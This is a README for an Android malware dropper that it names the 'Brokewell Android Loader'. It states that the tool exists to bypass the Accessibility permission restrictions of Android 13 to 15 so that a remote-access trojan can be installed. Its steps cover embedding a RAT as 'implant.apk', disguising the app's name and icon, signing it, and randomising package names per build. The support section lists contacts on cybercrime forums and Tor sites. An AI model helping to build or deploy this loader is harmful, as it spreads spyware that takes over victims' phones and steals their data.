# Brokewell Android Loader

this project is intended to bypass android 13/14/15 Accessibility permission restriction.

## How to use

1. clone this repository
2. set APK name by changing app_name on app/src/main/res/values/strings.xml
3. set APK icon by adding new image asset on app/src/main/res/. then adjust android:icon="@mipmap/ic_launcher" on AndroidManifest.xml
4. put your RAT (the one that need accessibility) on app/src/main/res/raw/implant.apk
5. on MainActivity.java file, change String IMPLANT_PKGNAME = ""; according to your implant.
6. generate your new/random signing CERTIFICATE with this command: keytool -genkey -v -keystore brkwlkey -alias brkwlkey -keyalg RSA -keysize 2048 -validity 1337 -storepass VerSecPass -keypass VerSecPass -dname 'CN=RUSSIA,O=MOSCOW,C=RU'
7. by default, this project are using "com.brkwl.apkstore" as PKGNAME. you can set yours by changing "applicationId" on app/build.gradle file. You can also enable the random package name generator so every release build will have a different & unique PKGNAME.

## Support

if you need an assistance with this project, feel free to reach me on:

- TOR homepage: http://sameditwkdzgeludjqscnwva4cw4jfkkafszbubfusbuxen3eu6ef3qd.onion/
- Exploit.in: https://exploitivzcm5dawzhe6c32bbylyggbjvh5dyvsvb5lkuz5ptmunkmqd.onion/profile/119861-samedit_marais/
- XSS.is (ex-DaMageLab): http://xssforumv3isucukbxhdhwz67hoa5e2voakcfkuieq4ch257vsburuid.onion/members/257797/
- RAMP4u.io: http://rampjcdlqvgkoz5oywutpo6ggl7g6tvddysustfl6qzhr5osr24xxqqd.onion/members/sameditmarais.2857/
- Telegram: https://t.me/BaronSamedit
- Jabber: samedit_marais@exploit.im

